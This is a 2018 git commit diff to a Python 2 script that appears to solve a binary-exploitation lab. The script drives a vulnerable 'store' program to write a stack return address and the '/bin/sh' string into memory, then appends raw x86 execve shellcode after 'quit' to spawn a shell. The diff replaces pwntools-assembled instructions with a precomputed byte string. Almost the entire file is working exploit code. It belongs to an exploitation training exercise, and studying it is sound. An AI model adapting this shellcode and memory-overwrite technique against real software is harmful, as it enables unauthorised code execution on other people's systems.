8b1ebb0c5d4c8ab0ec14eea7d79abe2ba148c433
Kamil Frankowicz <fumfi.255@gmail.com>
2018-01-16 09:12:45 +0100

    Update lab3a_new.py

--- lab3a_new.py
+++ lab3a_new.py
@@ -1,48 +1,26 @@
 #!/usr/bin/python2.7
-from pwn import *
-import binascii
-import struct
-context(arch ='i386', os ='linux')
 
-def string_to_int(string):
+SHELLCODE = "\x5e\x59\x59\x58\x56\x51\x89\xe3\x89\xf9\x89\xfa\xcd\x80"
+
+
+def convert_to_int_le(string):
     return str(int(string[::-1].encode('hex'), 16))
 
-def build_shellcode():
-
-	sh = [
-	    "pop esi",  
-	    "pop ecx",  
-	    "pop ecx", 
-	    "pop eax",  
-	    "push esi",
-	    "push ecx",
-	    "mov  ebx, esp",
-	    "mov ecx, edi",
-	    "mov edx, edi",
-	    "int  0x80"
-	]
-
-	shellcode = ''
-
-	for instr in sh:
-	    shellcode += asm(instr)
-
-	return shellcode
 
 print "store"
 print str(int(0xBFFFF58C))
 print "109"
 
 print "store"
-string_to_int('/sh')
+print convert_to_int_le('/sh')
 print "110"
 
 print "store"
-print string_to_int("/bin")
+print convert_to_int_le("/bin")
 print "112"
 
 print "store"
 print "11"
 print "113"
 
-print "quit" + build_shellcode()
+print "quit" + SHELLCODE
